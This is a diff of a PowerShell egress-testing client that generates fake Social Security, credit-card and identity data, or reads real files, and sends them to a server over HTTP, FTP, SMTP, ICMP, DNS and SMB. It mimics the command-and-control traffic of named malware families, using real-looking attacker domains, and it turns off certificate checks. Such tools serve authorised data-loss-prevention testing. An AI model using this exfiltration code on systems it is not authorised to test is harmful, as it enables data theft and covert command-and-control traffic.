@@ -1,15 +1,15 @@
 function Invoke-EgressAssess
 {
-    
+
 <#
 
 .Synopsis
-    Egress-assess powershell client. 
+    Egress-assess powershell client.
 
 .Description
     This script will connect to an Egress-assess server and transfer faux Personally Identifiable Information or
     files from the target system.
-    Due to processing overhead in Powershell, numbers are created in batches of 5,000. 
+    Due to processing overhead in Powershell, numbers are created in batches of 5,000.
     Reference: http://powershell.org/wp/2013/09/16/powershell-performance-the-operator-and-when-to-avoid-it/
 
 .Parameter Client
@@ -32,12 +32,18 @@ function Invoke-EgressAssess
 
 .Parameter Actor
     Assign a malware profile to your traffic
-    
+
 .Parameter Username
     The username for the ftp server
 
 .Parameter Password
     The password for the ftp server
+
+.Parameter GenerateToFile
+    The filename to store the generated data in
+
+.Parameter GeneratorLoops
+    The number of times to repeat generated data (speeds generation up)
 
 .Parameter Datatype
     The string containing the data you want to generate and exfil
@@ -88,6 +94,10 @@ function Invoke-EgressAssess
         [Parameter(Mandatory = $False)]
         [string]$Password,
         [Parameter(Mandatory = $False)]
+        [string]$GenerateToFile,
+        [Parameter(Mandatory = $False)]
+        [string]$GeneratorLoops=1,
+        [Parameter(Mandatory = $False)]
         [int]$Size = 1,
         [Parameter(Mandatory = $False)]
         [int]$Loops = 1,
@@ -100,10 +110,10 @@ function Invoke-EgressAssess
     {
         #stop looping errors
         $ErrorActionPreference = "Stop"
-        
+
         #get start time
         $startTime = (Get-Date)
-        
+
         #checks if Egress-Assess server is running using ICMP ping
         function Test-ServerConnection
         {
@@ -174,7 +184,7 @@ function Invoke-EgressAssess
                         Write-Verbose "[*] Protocol not available."
                         throw "Error"
                     }
-                    
+
                     #attempt to test connection to TCP ports
                     try
                     {
@@ -187,7 +197,7 @@ function Invoke-EgressAssess
                         Write-Verbose $ErrorMessage
                         Break
                     }
-                    
+
                     #connect to server if running
                     if ($socketTcp.Connected)
                     {
@@ -207,20 +217,31 @@ function Invoke-EgressAssess
                 throw "Error"
             }
         }
-        
-        
+
+
         function Generate-SSN
         {
             $script:AllSSN = @()
-            #determine the number of SSN based on 11 bytes per SSN 
+            #determine the number of SSN based on 11 bytes per SSN
             $num = [math]::Round(($Size * 1MB)/11)
             Write-Verbose "Generating $Size MB of Social Security Numbers ($num)..."
             $list = New-Object System.Collections.Generic.List[System.String]
 
+            if ($GenerateToFile) {
+                $num = [math]::Round(($Size * 1MB / $GeneratorLoops)/11)
+                $tempFile = [System.IO.Path]::GetTempFileName()
+                Write-Verbose "[*] Generating to temp file $tempFile"
+                $tempStream = New-Object System.IO.StreamWriter(
+                    $tempFile,
+                    'True',
+                    [System.Text.Encoding]::Default
+                )
+            }
+
             for ($i = 0; $i -lt $num; $i++)
             {
-            
-                if ($Fast) 
+
+                if ($Fast)
                 {
                     $randNum = Get-Random -minimum 10000 -maximum 100000
                     $randNumString = [string][int64]$randNum
@@ -230,11 +251,17 @@ function Invoke-EgressAssess
                     for ($i2 = $randSsnEnd; $i2 -lt $($randSsnEnd+500); $i2++)
                     {
                         $randSSN = "$randSsnBase$i2"
-                        $list.Add($randSSN)
+
+                        if ($GenerateToFile) {
+                            $tempStream.writeLine($randSSN)
+                        } else {
+                            $list.Add($randSSN)
+                        }
+
                         $i++
                     }
                 }
-                
+
                 else
                 {
                     $randNum = Get-Random -minimum 10000000000000 -maximum 100000000000000
@@ -244,10 +271,22 @@ function Invoke-EgressAssess
                     $r = "$($randNumString.substring(9,3))-$($randNumString.substring(12,2))-$($randNumString.substring(2,4))"
                     $list.Add($r)
                     $i++
-                }           
+                }
             }
-            
-            $script:AllSSN = $list.ToArray()
+
+            if ($GenerateToFile)
+            {
+                $tempStream.close()
+                for ($i=0; $i -lt $GeneratorLoops; $i++) {
+                    Write-Verbose "[*] Using $tempFile to build $GenerateToFile"
+                    Append-Data $tempFile $GenerateToFile
+                }
+                Break Script
+            }
+            else
+            {
+                $script:AllSSN = $list.ToArray()
+            }
         }
 
         function Generate-NI
@@ -260,8 +299,8 @@ function Invoke-EgressAssess
 
             for ($i = 0; $i -lt $num; $i++)
             {
-            
-                if ($Fast) 
+
+                if ($Fast)
                 {
                     $randString = -join ((65..90) | Get-Random -Count 3 | % {[char]$_})
                     $randNum = Get-Random -minimum 100 -maximum 1000
@@ -276,7 +315,7 @@ function Invoke-EgressAssess
                         $i++
                     }
                 }
-                
+
                 else
                 {
                     $randString = -join ((65..90) | Get-Random -Count 3 | % {[char]$_})
@@ -287,23 +326,36 @@ function Invoke-EgressAssess
                     $r = "$($randString.substring(0,2))$($randNumString.substring(6,6))$($randString.substring(2))"
                     $list.Add($r)
                     $i++
-                }           
+                }
+
+                if ($GenerateToFile)
+                {
+                    $list | Out-File -encoding ASCII -Append $GenerateToFile
+                    $list.Clear()
+                }
             }
-            
-            $script:AllNI = $list.ToArray()
+
+            if ($GenerateToFile)
+            {
+                Break Script
+            }
+            else
+            {
+                $script:AllNI = $list.ToArray()
+            }
         }
-        
+
         function Generate-CreditCards
         {
-            
+
             $script:AllCC = @()
             $script:list = New-Object System.Collections.Generic.List[System.String]
-            
+
             Write-Verbose "[*] Generating Credit Cards............."
-            
+
             $num = [math]::Round($Size * 1MB)/19
             $intCardType = 0
-                        
+
             for ($i = 0; $i -lt $num; $i++)
             {
 
@@ -311,25 +363,25 @@ function Invoke-EgressAssess
                 {
                     switch ($(Get-Random -maximum 4))
                     {
-                        0 { # Generate Visa 
+                        0 { # Generate Visa
                             $randNum = Get-Random -minimum 100000000000000 -maximum 1000000000000000
                             $randNumString = [string][int64]$randNum
                             $randCCbase = "4$($randNumString.substring(0,3))-$($randNumString.substring(3,4))-$($randNumString.substring(7,4))-"
                         }
-                        
+
                         1 { # Generate MasterCard
                             $randNum = Get-Random -minimum 100000000000000 -maximum 1000000000000000
                             $randNumString = [string][int64]$randNum
                             $randCCbase = "5$($randNumString.substring(0,3))-$($randNumString.substring(3,4))-$($randNumString.substring(7,4))-"
                         }
-                        
-                        2 { # Generate Discover 
+
+                        2 { # Generate Discover
                             $randNum = Get-Random -minimum 10000000 -maximum 100000000
                             $randNumString = [string][int64]$randNum
                             $randCCbase = "6011-$($randNumString.substring(0,4))-$($randNumString.substring(4,4))-"
                         }
-                        
-                        3 { # Generate Amex 
+
+                        3 { # Generate Amex
                             $randNum = Get-Random -minimum 100000000000000 -maximum 1000000000000000
                             $randNumString = [string][int64]$randNum
                             $randCCbase = "3$($randNumString.substring(0,3))-$($randNumString.substring(3,4))-$($randNumString.substring(7,4))-"
@@ -343,43 +395,43 @@ function Invoke-EgressAssess
                         $randCC = "$randCCbase$i2"
                         $list.Add($randCC)
                         $i++
-                    }                    
+                    }
                 }
 
                 else
                 {
-                    $baseCC = $null 
+                    $baseCC = $null
 
                     if ($intCardType -gt 3)
                     {
                         $intCardType = 0
                     }
 
-                    
+
                     switch ($intCardType)
                     {
-                        0 {  # Generate Visa 
+                        0 {  # Generate Visa
                             $randNum = Get-Random -minimum 100000000000000 -maximum 1000000000000000
                             $randNumString = [string][int64]$randNum
                             $randCC = "4$($randNumString.substring(0,3))-$($randNumString.substring(3,4))-$($randNumString.substring(7,4))-$($randNumString.substring(11,4))"
                             $script:list.Add($randCC)
                         }
 
-                        1 { # Generate MasterCard 
+                        1 { # Generate MasterCard
                             $randNum = Get-Random -minimum 100000000000000 -maximum 1000000000000000
                             $randNumString = [string][int64]$randNum
                             $randCC = "5$($randNumString.substring(0,3))-$($randNumString.substring(3,4))-$($randNumString.substring(7,4))-$($randNumString.substring(11,4))"
                             $script:list.Add($randCC)
                         }
-                                
-                        2 { # Generate Discover 
+
+                        2 { # Generate Discover
                             $randNum = Get-Random -minimum 100000000000 -maximum 1000000000000
                             $randNumString = [string][int64]$randNum
                             $randCC = "6011-$($randNumString.substring(0,4))-$($randNumString.substring(4,4))-$($randNumString.substring(8,4))"
                             $script:list.Add($randCC)
                         }
-                        
-                        3 { # Generate Amex 
+
+                        3 { # Generate Amex
                             $randNum = Get-Random -minimum 100000000000000 -maximum 1000000000000000
                             $randNumString = [string][int64]$randNum
                             $randCC = "3$($randNumString.substring(0,3))-$($randNumString.substring(3,4))-$($randNumString.substring(7,4))-$($randNumString.substring(11,4))"
@@ -388,10 +440,24 @@ function Invoke-EgressAssess
                     }
                     $intCardType++
                 }
+
+                if ($GenerateToFile)
+                {
+                    $list | Out-File -encoding ASCII -Append $GenerateToFile
+                    $list.Clear()
+                }
             }
-            $script:AllCC = $Script:list.ToArray()
+
+            if ($GenerateToFile)
+            {
+                Break Script
+            }
+            else
+            {
+                $script:AllCC = $Script:list.ToArray()
+            }
         }
-        
+
         function Generate-Identity
         {
             $script:AllNames = @()
@@ -403,7 +469,7 @@ function Invoke-EgressAssess
             'mary', 'adam', 'melissa', 'matthew', 'nick', 'stephanie',
             'anthony', 'tom', 'josh', 'laura', 'tim', 'jim', 'amy', 'peter',
             'dan', 'nicole', 'tony')
-            
+
             $LastNames = @('smith', 'johnson', 'jones', 'williams', 'brown',
             'lee', 'khan', 'singh', 'kumar', 'miller', 'davis', 'wilson',
             'taylor', 'thomas', 'garcia', 'anderson', 'sharma', 'martin',
@@ -412,7 +478,7 @@ function Invoke-EgressAssess
             'hernandez', 'clark', 'lewis', 'robinson', 'young', 'gonzalez',
             'hall', 'wright', 'scott', 'perez', 'green', 'allen', 'tan',
             'shah', 'roberts', 'adams', 'nguyen', 'james', 'hill')
-            
+
             $Addresses = @('PO Box 4927 Montgomery, AL 36103', 'PO Box 110801 Juneau, AK 99811-0801',
             '1110 W. Washington Street, Suite 155 Phoenix, AZ 85007',
             'One Capitol Mall Little Rock, AR 72201',
@@ -455,7 +521,7 @@ function Invoke-EgressAssess
             '110 3rd Street Lenoir, NC 28645',
             '488 Schoolhouse Lane Johnston, RI 02919',
             '658 Market Street New Brunswick, NJ 08901')
-            
+
             $list = New-Object System.Collections.Generic.List[System.String]
             $num = [math]::Round(($Size * 1MB)/69)
             $percentcount = 0
@@ -471,19 +537,29 @@ function Invoke-EgressAssess
                 $First = Get-Random -InputObject $FirstNames
                 $Last = Get-Random -InputObject $LastNames
                 $Address = Get-Random -InputObject $Addresses
-                
+
                 $randNum = Get-Random -minimum 100000000 -maximum 1000000000
                 $randNumString = [string][int64]$randNum
                 $SSN = "$($randNumString.substring(0,3))-$($randNumString.substring(3,2))-$($randNumString.substring(5,4))"
-                
+
                 $TextInfo = (Get-Culture).TextInfo
                 $r = "$($TextInfo.ToTitleCase($First.ToLower()) + " " + $TextInfo.ToTitleCase($Last.ToLower()) + " $Address" + " $SSN")"
                 $s = Get-Random -InputObject $r
                 $list.Add($s)
             }
-            $script:AllNames = $list.ToArray()
+
+            if ($GenerateToFile)
+            {
+                $list | Out-File -encoding ASCII -Append $GenerateToFile
+                $list.Clear()
+                Break Script
+            }
+            else
+            {
+                $script:AllNames = $list.ToArray()
+            }
         }
-        
+
         function Use-File
         {
             $global:FileTransfer = $True
@@ -504,11 +580,11 @@ function Invoke-EgressAssess
             '/bin/read_i.php?a1=step2-down-k&a2=VSEJKNEF&a3=SW5mb1N5c0BVc2VyIERCQURCQFNZU0RCQSAoMDg1MClDUFUgOiBJbnRlbChSKSBDb3JlKFRNKSBpNy05MCBDUFUgQCAzMjAwR0h6U3lzdGVtIE9TOiBNaWNyb3NvZnQgV2luZG93cyBTZXJ2ZXIgMjAwMyBOZXQgY2FyZCA6IDE5Mi4xNjguMTUzLjIgKDEzMzc3MzMxMTMzNyk=&a4=NOD'
             '/bin/read_i.php?a1=step2-down-j&a2=ALFDOEJNKF&a3=SW5mb1N5c0BVc2VyIERBZG1pbkBEQ1N5cyAoMDk1MClDUFUgOiBJbnRlbChSKSBDb3JlKFRNKSBpNy05MDAgQ1BVIEAgMzgwMUdIelN5c3RlbSBPUzogTWljcm9zb2Z0IFdpbmRvd3MgU2VydmVyIDIwMDggTmV0IGNhcmQgOiAxOTIuMTY4LjE5My4yICgxMzM3NzMzMTEzMzcp&a4=NV')
             $checkinDomains = @('autolace.twilightparadox.com', 'automachine.servequake.com')
-            
+
             # Detect what datatype we're sending
             if ($Datatype -contains "ssn" -or "cc" -or "identity")
             {
-                
+
                 if ($Datatype -eq "ssn")
                 {
                     Generate-SSN
@@ -529,7 +605,7 @@ function Invoke-EgressAssess
                     Generate-Identity
                     $Data = $AllNames
                 }
-                
+
             }
             else
             {
@@ -543,7 +619,7 @@ function Invoke-EgressAssess
                     Try
                     {
                         # Checkin Request 1
-                        
+
                         if ($client -eq "http")
                         {
                             $Url = "http://" + $IP + "/major/images/view.php"
@@ -571,7 +647,7 @@ function Invoke-EgressAssess
                         Write-Verbose $ErrorMessage
                         Break
                     }
-                    
+
                     # Checkin Request 2
                     if ($client -eq "http")
                     {
@@ -627,14 +703,14 @@ function Invoke-EgressAssess
                     $localLoop--
                 }
                 While ($localLoop -gt 0)
-                
+
                 Write-Verbose "[*] Transfer complete!"
                 $loops--
                 Write-Verbose "[*] $loops loops remaining.."
             }
             While ($loops -gt 0)
         }
-        
+
         function Use-Etumbot
         {
             $domains = @('200.27.173.58', '200.42.69.140', '92.54.232.42', '133.87.242.63',
@@ -656,11 +732,11 @@ function Invoke-EgressAssess
             $("/manage/asp/item.asp?id=" + $(Get-Random -InputObject $encodedString) + "&&mux=" + $(Get-Random -InputObject $encodedString)),
             $("/article/30441/Review.asp?id=" + $(Get-Random -InputObject $encodedString) + "&&date=" + $(Get-Random -InputObject $encodedString)),
             $("/tech/s.asp?m=" + $(Get-Random -InputObject $encodedString)))
-            
+
             # Detect what datatype we're sending
             if ($Datatype -contains "ssn" -or "cc" -or "identity")
             {
-                
+
                 if ($Datatype -eq "ssn")
                 {
                     Generate-SSN
@@ -681,7 +757,7 @@ function Invoke-EgressAssess
                     Generate-Identity
                     $Data = $AllNames
                 }
-                
+
             }
             else
             {
@@ -712,14 +788,14 @@ function Invoke-EgressAssess
                 $wc.Headers.Add('Pragma', 'no-cache')
                 Write-Verbose  "Uploading  data..."
                 $wc.UploadString($uri, $Data)
-                
-                
+
+
                 # Main transfer
                 $localLoop = 5
                 Do
                 {
                     Write-Verbose "Looping 5 times"
-                    
+
                     $ranURI = Get-Random -InputObject $uris
                     if ($client -eq "http")
                     {
@@ -745,8 +821,8 @@ function Invoke-EgressAssess
                     $localLoop--
                 }
                 While ($localLoop -gt 0)
-                
-                
+
+
                 Write-Verbose "[*] Transfer complete!"
                 $loops--
                 Write-Verbose "[*] $loops loops remaining.."
@@ -754,7 +830,7 @@ function Invoke-EgressAssess
             While ($loops -gt 0)
         }
         ## End Eumbot
-        
+
         function Use-Zeus
         {
             $domains = @('0x.x.gg', '6pjddrtt7.com', 'apexholdngs.com', 'baoshlda.com',
@@ -950,11 +1026,11 @@ function Invoke-EgressAssess
             #$post_data = @('zeus_id uid=0(root) gid=0(root) groups=0(root)','zeus_whoami root'},'zeus_dir C:\\, C:\\Windows',
             #  'zeus_ps': 'svchost.exe, spoolsvc.exe, explorer.exe, iexplorer.exe','zeus_ipconfig': '192.168.1.15 255.255.255.0 192.168.1.1',
             # 'zeus_ping': 'google.com time=13.6, 15.1, 19.8, 20')
-            
+
             # Detect what datatype we're sending
             if ($Datatype -contains "ssn" -or "cc" -or "identity")
             {
-                
+
                 if ($Datatype -eq "ssn")
                 {
                     Generate-SSN
@@ -981,7 +1057,7 @@ function Invoke-EgressAssess
                 Write-Verbose "[*] You did not provide a data type to generate."
                 Return
             }
-            
+
             Do
             {
                 try
@@ -1020,7 +1096,7 @@ function Invoke-EgressAssess
             }
             While ($loops -gt 0)
         }
-        
+
         function Use-PutterPanda
         {
             function Gen-Numbers($num)
@@ -1042,7 +1118,7 @@ function Invoke-EgressAssess
                     Get-Random -Minimum 1000000 -Maximum 9999999
                 }
             }
-            
+
             $domains = @('ctable.org', 'gamemuster.com', 'kyoceras.net', 'nestlere.com',
             'raylitoday.com', 'renewgis.com', 'siseau.com', 'bmwauto.org',
             't008.net', 'vssigma.com', 'anyoffice.info', 'it-bar.net',
@@ -1061,11 +1137,11 @@ function Invoke-EgressAssess
             $("/MicrosoftUpdate/GetUpdate/KB" + $(Gen-Numbers(7)) + "/default.asp?tmp=" + $(Get-Random -InputObject $encodedHostnames)),
             $("/MicrosoftUpdate/GetFiles/KB" + $(Gen-Numbers(7)) + "/default.asp?tmp=" + $(Get-Random -InputObject $encodedHostnames)),
             $("/MicrosoftUpdate/WWRONG/KB" + $(Gen-Numbers(7)) + "/default.asp?tmp=" + $(Get-Random -InputObject $encodedHostnames)))
-            
+
             # Detect what datatype we're sending
             if ($Datatype -contains "ssn" -or "cc" -or "identity")
             {
-                
+
                 if ($Datatype -eq "ssn")
                 {
                     Generate-SSN
@@ -1092,7 +1168,7 @@ function Invoke-EgressAssess
                 Write-Verbose "[*] You did not provide a data type to generate."
                 Return
             }
-            
+
             Do
             {
                 try
@@ -1157,30 +1233,30 @@ function Invoke-EgressAssess
                 Break
             }
         }
-        
+
         function Use-HTTP
         {
-            
+
             function Get-UserAgent($UASelect)
             {
                 function Use-Mozilla
                 {
                     $script:UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
                 }
-                
+
                 function Use-InternetExplorer
                 {
                     $script:UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
                 }
-                
+
                 function Use-Safari
                 {
                     $script:UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A"
                 }
-                
+
                 if ($UASelect -contains "IE" -or "Moz" -or "Saf")
                 {
-                    
+
                     if ($UASelect -contains "IE")
                     {
                         Use-InternetExplorer
@@ -1205,7 +1281,7 @@ function Invoke-EgressAssess
                         3 { Use-Safari }
                     }
                 }
-                
+
             }
             # Detect what datatype we're sending
             if (($Datatype -contains "ssn" -or "cc" -or "identity") -and (!(Test-Path -Path $Datatype)))
@@ -1239,9 +1315,9 @@ function Invoke-EgressAssess
                 {
                     $Url = "https://" + $IP + "/post_data.php"
                 }
-                
+
             }
-            
+
             elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity")
             {
                 if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
@@ -1262,7 +1338,7 @@ function Invoke-EgressAssess
                 Write-Verbose "[*] You did not provide a data type to generate."
                 Return
             }
-            # This line is required to accept any SSL certificate errors  
+            # This line is required to accept any SSL certificate errors
             [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
             $uri = New-Object -TypeName System.Uri -ArgumentList $Url
             $wc = New-Object -TypeName System.Net.WebClient
@@ -1276,7 +1352,7 @@ function Invoke-EgressAssess
                 Get-UserAgent -UASelect ""
                 $wc.Headers.Add('UserAgent', $script:UserAgent)
             }
-            
+
             if ($proxy)
             {
                 $proxy = [System.Net.WebRequest]::GetSystemWebProxy()
@@ -1285,15 +1361,36 @@ function Invoke-EgressAssess
             }
             if ($filetransfer -eq $true)
             {
-                
-                $data = Get-Content $SourceFilePath -Encoding Byte -ReadCount 0
                 $wc.Headers.Add('Content-Type', 'mimeType')
                 $wc.Headers.Add('Filename', $FileName)
-                Write-Verbose  "Uploading data.."
-                $wc.UploadData($uri, 'POST', $data)
+
+                $reader = New-Object System.IO.FileStream($SourceFilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
+                $bufferSize = 256000000
+                $buffer = New-Object byte[] $bufferSize
+                $currentChunk = 1
+                $totalChunks = [math]::Round($reader.Length / $bufferSize)
+
+                while (($n = $reader.Read($buffer, 0, $bufferSize)) -gt 0) {
+                    Write-Verbose  "[*] Uploading chunk $currentChunk of $totalChunks.."
+
+                    # Add append on second chunk, so that we aren't always appending to a remote file
+                    if ($currentChunk -eq 2) {
+                        $wc.Headers.Add('Append', 'append')
+                    }
+
+                    if ($n -lt $bufferSize) {
+                        $tmp = New-Object byte[] $n
+                        [array]::Copy($tmp, $buffer, $n)
+                        $buffer = $tmp
+                        $bufferSize = $buffer.Length
+                    }
+                    $wc.UploadData($uri, 'POST', $buffer)
+                    $currentChunk++
+                }
+
                 Write-Verbose "[*] Transaction Complete."
             }
-            
+
             else
             {
                 Do
@@ -1318,7 +1415,7 @@ function Invoke-EgressAssess
                 While ($loops -gt 0)
             }
         }
-        
+
         function Use-Ftp
         {
             if ($Datatype -contains "ssn" -or "cc" -or "identity")
@@ -1343,7 +1440,7 @@ function Invoke-EgressAssess
                     Generate-Identity
                     $FTPData = $AllNames
                 }
-                
+
                 elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity")
                 {
                     if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
@@ -1377,7 +1474,7 @@ function Invoke-EgressAssess
                         $Date = Get-Date -Format Mdyyyy_hhmmss
                         $Path = "ftpdata" + $Date + ".txt"
                         $Destination = "ftp://" + $Username + ":" + $Password + "@" + $IP + "/" + $Path
-                        
+
                         $ftpClient = New-Object System.Net.WebClient
                         $uri = New-Object System.Uri($Destination)
 
@@ -1390,7 +1487,7 @@ function Invoke-EgressAssess
                         Write-Verbose "[*] Uploading data.."
 
                         $ftpClient.UploadString($uri, $FTPData)
-                        
+
                         Write-Verbose "[*] File Transfer Complete."
                     }
                     catch
@@ -1407,7 +1504,7 @@ function Invoke-EgressAssess
                 While ($loops -gt 0)
             }
         }
-        
+
         function Use-SFTP
         {
             $NetVersion = Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' | sort pschildname -des | select -fi 1 -exp pschildname
@@ -1439,7 +1536,7 @@ function Invoke-EgressAssess
                     Generate-Identity
                     $FTPData = $AllNames
                 }
-                
+
                 elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity")
                 {
                     if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
@@ -1461,7 +1558,7 @@ function Invoke-EgressAssess
                 Write-Verbose "[*] Error loading dll"
                 Break
             }
-            
+
             if ($global:FileTransfer -eq $True)
             {
                 $Path = get-childitem $Datatype | % { $_.Name }
@@ -1482,7 +1579,7 @@ function Invoke-EgressAssess
                     Break
                 }
             }
-            # Connect to Egress-Assess Server       
+            # Connect to Egress-Assess Server
             try
             {
                 $Con = New-Object Renci.SshNet.PasswordConnectionInfo($IP, $Username, $Password)
@@ -1539,9 +1636,9 @@ function Invoke-EgressAssess
                     Break
                 }
             }
-            
+
         }
-        
+
         function Use-SMTP
         {
             if ($Datatype -contains "ssn" -or "cc" -or "identity")
@@ -1566,7 +1663,7 @@ function Invoke-EgressAssess
                     Generate-Identity
                     $SMTPData = $AllNames
                 }
-                
+
                 elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity")
                 {
                     if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
@@ -1604,7 +1701,7 @@ function Invoke-EgressAssess
             }
             While ($loops -gt 0)
         }
-        
+
         function Use-ICMP
         {
             if ($Datatype -contains "ssn" -or "cc" -or "identity")
@@ -1629,7 +1726,7 @@ function Invoke-EgressAssess
                     Generate-Identity
                     [string]$ICMPData = $AllNames
                 }
-                
+
                 elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity")
                 {
                     if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
@@ -1660,7 +1757,7 @@ function Invoke-EgressAssess
             $PacketNumber = 1
             $bufferSize = 1050
             $Timeout = 1000
-            
+
             if ($FileTransfer -eq $True)
             {
                 $Delimiter = '.:::-989-:::.'
@@ -1728,8 +1825,8 @@ function Invoke-EgressAssess
                 While ($Loops -gt 0)
             }
         }
-        
-        
+
+
         function Use-DNSTXT
         {
             if ($Datatype -contains "ssn" -or "cc" -or "identity")
@@ -1754,7 +1851,7 @@ function Invoke-EgressAssess
                     Generate-Identity
                     [string]$DNSData = $AllNames
                 }
-                
+
                 elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity")
                 {
                     Write-Verbose "[*] You did not provide a data type to generate."
@@ -1771,7 +1868,7 @@ function Invoke-EgressAssess
                     [int]$ByteReader = 0
                     $bufferSize = 35
                     $PacketNumber = 1
-                    
+
                     if ($DNSData.length % $DefaultLength -eq 0)
                     {
                         [int]$TotalPackets = $($DNSData.length) / $DefaultLength
@@ -1786,7 +1883,7 @@ function Invoke-EgressAssess
                     {
                         try
                         {
-                            
+
                             $DataToSend = $DNSData.Substring($ByteReader, $DefaultLength)
                             $DataBytes = [System.Text.Encoding]::UTF8.GetBytes($DataToSend)
                             $EncodedData = [System.Convert]::ToBase64String($DataBytes)
@@ -1817,7 +1914,7 @@ function Invoke-EgressAssess
             }
             While ($loops -gt 0)
         }
-        
+
         function Use-DNSResolved
         {
             if ($Datatype -contains "ssn" -or "cc" -or "identity")
@@ -1842,7 +1939,7 @@ function Invoke-EgressAssess
                     Generate-Identity
                     [string]$DNSData = $AllNames
                 }
-                
+
                 elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity")
                 {
                     Write-Verbose "[*] You did not provide a data type to generate."
@@ -1883,7 +1980,7 @@ function Invoke-EgressAssess
             }
             While ($loops -gt 0)
         }
-        
+
         function Use-SMB
         {
             if ($Datatype -eq "cc")
@@ -1909,7 +2006,7 @@ function Invoke-EgressAssess
             elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity")
             {
                 if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
-                
+
                 Write-Verbose "[*] Sending file to egress server.."
                 try
                 {
@@ -1924,7 +2021,7 @@ function Invoke-EgressAssess
                     Write-Verbose $ErrorMessage
                     Break
                 }
-                
+
             }
             # If we're sending faux data, generate the file, send and delete it.
             Do
@@ -1935,7 +2032,7 @@ function Invoke-EgressAssess
                     $Path = "smbdata_" + $Date + ".txt"
                     $SMBData | Out-File "$env:temp\$Path"
                     Copy-Item -Path $env:temp\$Path -Destination \\$IP\data
-                    
+
                     try
                     {
                         Remove-Item -Path $env:temp\$Path
@@ -1961,7 +2058,7 @@ function Invoke-EgressAssess
             }
             While ($loops -gt 0)
         }
-        
+
         #write report to console and file to C:\Egress-Assess\report.txt
         #future enhancement: add variable input for report path and filename
         #future enhancement: add filename of exfilled file to report
@@ -1995,6 +2092,26 @@ function Invoke-EgressAssess
                 break
             }
         }
+
+        function Append-Data($source, $destination) {
+            $reader = [System.IO.File]::OpenText($source)
+            $writer = New-Object System.IO.StreamWriter(
+                $destination,
+                'True', # Append to file
+                [System.Text.Encoding]::Default
+            )
+
+            try {
+                Write-Verbose "[*] Beginning Append..."
+                while($null -ne ($line = $reader.ReadLine())) {
+                    $writer.writeLine($line)
+                }
+            } finally {
+                $reader.close()
+                $writer.close()
+                Write-Verbose "[*] Append Complete!"
+            }
+        }
     }
     process
     {
@@ -2002,11 +2119,12 @@ function Invoke-EgressAssess
         {
             Use-Actor $Actor
         }
-        if (!$NoPing)
+
+        if (!$NoPing -and !$GenerateToFile)
         {
             Test-ServerConnection
         }
-        
+
         if ($client -eq "http" -or $client -eq "https")
         {
             Use-HTTP
@@ -2044,10 +2162,10 @@ function Invoke-EgressAssess
             Write-Verbose "[*] You failed to provide a protocol"
             Return
         }
-        
+
         #get end time
         $endTime = (Get-Date)
-        
+
         if ($Report -gt 0)
         {
             Write-Report
